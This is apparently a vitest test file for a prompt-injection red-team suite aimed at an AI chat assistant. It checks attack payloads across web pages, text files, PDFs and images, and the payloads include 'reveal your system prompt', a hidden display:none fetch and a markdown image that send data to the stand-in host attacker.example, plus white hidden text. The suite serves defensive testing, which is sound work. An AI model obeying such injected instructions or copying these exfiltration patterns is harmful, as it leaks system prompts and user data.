import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { ATTACKS, attackById, hostsIn, isAttackerHost, promptFor } from "./attacks.ts";
import { ATTACKER_HOST, CANARY } from "./canary.ts";

const root = new URL("../", import.meta.url);
const read = (path: string): string => readFileSync(fileURLToPath(new URL(path, root)), "utf-8");

describe("attack set (README section 5)", () => {
  it("has unique ids and covers A1 to A8", () => {
    const ids = ATTACKS.map((a) => a.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (let n = 1; n <= 8; n++) expect(ids.some((id) => id.startsWith(`A${n}`)), `A${n}`).toBe(true);
  });

  it("points every payload at a file that exists", () => {
    for (const attack of ATTACKS.filter((a) => a.payload)) {
      expect(existsSync(fileURLToPath(new URL(attack.payload ?? "", root))), attack.id).toBe(true);
    }
  });

  it("gives every attack a rubric and a prompt", () => {
    for (const attack of ATTACKS) {
      expect(attack.rubric.length, attack.id).toBeGreaterThan(20);
      expect(attack.prompt.length, attack.id).toBeGreaterThan(10);
    }
  });

  it("plays the text file and the PDF attacks: attachments reach the model since AICHAT-244", () => {
    expect(ATTACKS.filter((a) => a.surface === "file").map((a) => a.id)).toEqual(["A2a", "A2b"]);
  });

  it("sends the web attacks to pages the team hosts", () => {
    for (const attack of ATTACKS.filter((a) => a.surface === "web")) {
      expect(promptFor(attack, "http://attack-pages:8080/")).toContain(`http://attack-pages:8080/${attack.payload?.replace("pages/", "")}`);
    }
  });

  it("finds an attack by id and rejects an unknown id", () => {
    expect(attackById("A4").surface).toBe("web");
    expect(() => attackById("A99")).toThrow(/unknown attack/);
  });
});

describe("payload files", () => {
  const pages = ATTACKS.filter((a) => a.payload?.startsWith("pages/")).map((a) => a.payload ?? "");

  it("send exfiltration only to attacker.example, which does not exist", () => {
    for (const file of [...pages, "payloads/a1-image-injection.html", "payloads/a2-injection.txt", "payloads/a2-hidden-text.html"]) {
      const hosts = hostsIn(read(file)).filter((h) => !isAttackerHost(h));
      expect(hosts, file).toEqual([]);
    }
  });

  it("carry the instruction they are meant to inject", () => {
    expect(read("pages/a3-visible.html")).toMatch(/reveal your system prompt/);
    expect(read("pages/a4-hidden-fetch.html")).toContain(`https://${ATTACKER_HOST}/log?c=`);
    expect(read("pages/a4-hidden-fetch.html")).toContain("display:none");
    expect(read("pages/a5-markdown-image.html")).toContain(`![status](https://${ATTACKER_HOST}/p?d=`);
    expect(read("payloads/a2-hidden-text.html")).toContain("color: #fff");
  });

  it("do not contain the canary (it lives in the system prompt only)", () => {
    for (const file of pages) expect(read(file)).not.toContain(CANARY);
  });

  it("start a PNG and a PDF with the right magic bytes", () => {
    expect(readFileSync(fileURLToPath(new URL("payloads/a1-image-injection.png", root))).subarray(1, 4).toString()).toBe("PNG");
    expect(readFileSync(fileURLToPath(new URL("payloads/a2-hidden-text.pdf", root))).subarray(0, 5).toString()).toBe("%PDF-");
  });
});

describe("URL helpers", () => {
  it("lists the hosts of the URLs in a text", () => {
    expect(hostsIn("see https://Attacker.example/log?c=1 and http://localhost:8080/x")).toEqual(["attacker.example", "localhost"]);
  });

  it("recognises the attacker domain and its subdomains only", () => {
    expect(isAttackerHost("attacker.example")).toBe(true);
    expect(isAttackerHost("x.attacker.example")).toBe(true);
    expect(isAttackerHost("notattacker.example")).toBe(false);
    expect(isAttackerHost("example.com")).toBe(false);
  });
});
